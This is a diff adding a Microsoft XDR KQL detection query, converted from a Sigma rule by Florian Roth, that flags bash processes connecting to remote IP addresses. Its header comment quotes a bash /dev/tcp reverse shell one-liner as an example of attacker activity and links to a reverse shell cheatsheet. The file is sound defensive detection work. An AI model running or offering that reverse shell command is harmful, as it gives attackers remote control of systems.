@@ -1,0 +1,19 @@
+// Title: Linux Reverse Shell Indicator
+// Sigma ID: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
+// Status: test | Level: critical
+// Author: Florian Roth (Nextron Systems)
+// Date: 2021-10-16 | Modified: 2022-12-25
+// ATT&CK: execution, T1059.004
+// Description: Detects a bash contecting to a remote IP address (often found when actors do something like
+//   'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
+// False positives:
+//   - Unknown
+// References:
+//   - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+// Sigma rule: https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml
+// License: Detection Rule License (DRL) 1.1 - https://github.com/SigmaHQ/Detection-Rule-License
+// Converted by sigma2kql (target: microsoft_xdr, pySigma 1.5.1, pySigma-backend-kusto 1.0.1)
+// Validation: passed (Kusto.Language 12.4.1, microsoft_xdr schema)
+
+DeviceNetworkEvents
+| where InitiatingProcessFolderPath endswith "/bin/bash" and (not((RemoteIP in~ ("127.0.0.1", "0.0.0.0"))))
